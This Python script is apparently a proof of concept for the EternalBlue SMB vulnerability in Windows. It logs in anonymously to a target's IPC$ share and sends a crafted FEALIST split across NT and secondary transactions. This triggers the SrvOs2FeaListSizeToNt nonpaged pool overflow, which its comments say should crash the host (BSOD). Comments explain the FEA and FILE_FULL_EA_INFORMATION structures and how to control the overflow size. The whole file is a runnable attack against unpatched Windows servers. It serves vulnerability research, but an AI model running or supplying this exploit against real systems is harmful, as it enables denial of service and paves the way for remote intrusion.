from impacket import smb
from mysmb import MYSMB
from struct import pack
import random
import sys

'''
PoC: demonstrates how NSA eternalblue triggers the buffer overflow
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]


conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)

'''
To craft FEALIST for nonpaged pool overflow, we need to know following data structures.

typedef struct _FEA {   /* fea */
	BYTE fEA;        /* flags                              */
	BYTE cbName;     /* name length not including NULL */
	USHORT cbValue;  /* value length */
} FEA, *PFEA;

typedef struct _FEALIST {    /* feal */
	DWORD cbList;   /* total bytes of structure including full list */
	FEA list[1];    /* variable length FEA structures */
} FEALIST, *PFEALIST;

typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset;
  UCHAR  Flags;
  UCHAR  EaNameLength;
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

A server need to convert FEA to FILE_FULL_EA_INFORMATION. FEA is byte aligned while FILE_FULL_EA_INFORMATION is DWORD aligned.
For example:
- FEA '\x00\x01\x01\x00n\x00v' (flags=0, cbName=1, cbValue=1, Name='n\0', Value='v')
  - to FILE_FULL_EA_INFORMATION '????\x00\x00\x01\x00n\x00v'+'\x00' (last byte is padding)
- FEA '\x00\x00\x00\x00\x00' (flags=0, cbName=0, cbValue=0, Name='\0', Value='')
  - to FILE_FULL_EA_INFORMATION '????\x00\x00\x00\x00\x00'+'\x00'*3 (last 3 bytes are padding)

From last example, smallest FEA size is 5 bytes. When it is converted to FILE_FULL_EA_INFORMATION, a buffer size is 12 bytes.
With many small FEA entries, a server need to allocate buffer for FILE_FULL_EA_INFORMATION entries much larger than input.
This is helpful to control the size of vulnerable nonpaged pool.

A FEA flags value is another important value in exploitation. Only 0 and 0x80 is valid flags. Before converting FEA to
FILE_FULL_EA_INFORMATION, the flags is checked first. If the flags is invalid, the converting process is stopped. So we can use
the flags value to controll how many bytes we want to overflow.
'''
# OOB write ~0xcc00 (OOB read ~0x8c00 too because we do not provide enough data for last FEA)
# With this large OOB write and read, page fault should be happen (BSOD)
payload = pack('<I', 0x10000)  # FEALIST.cbList
payload += pack('<BBH', 0, 0, 0xc003) + 'A'*0xc004  # FEA
# because of bug in SrvOs2FeaListSizeToNt(), below FEA is converted to FILE_FULL_EA_INFORMATION but a server
# does not allocate buffer for it.
payload += pack('<BBH', 0, 0, 0xcc00) + 'B'*0x4000

# First transaction request MUST be NT transaction because we need to send a data size >=0x10000
mid = conn.next_mid()
# NT function can be any
TRANS2_OPEN2 = 0  # need parameter at least 30 bytes
conn.send_nt_trans(2, setup=pack('<H', TRANS2_OPEN2), mid=mid, param='\x00'*30, data=payload[:1000], totalDataCount=len(payload))
i = 1000
while i < len(payload):
	sendSize = min(4096, len(payload) - i)
	# As mentioned in BUG.txt, we can send any secondary transaction for filling transaction data.
	# Only last request that complete the transaction data need to be correct (TRANS2 in this case).
	# We can also send data in any order.
	method = 1 if len(payload) - i <= 4096 else random.randint(0, 2)
	if method == 0:
		conn.send_trans_secondary(mid, data=payload[i:i+sendSize], dataDisplacement=i)
	elif method == 1:
		conn.send_trans2_secondary(mid, data=payload[i:i+sendSize], dataDisplacement=i)
	else:
		conn.send_nt_trans_secondary(mid, data=payload[i:i+sendSize], dataDisplacement=i)
	i += sendSize

conn.recvSMB()

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
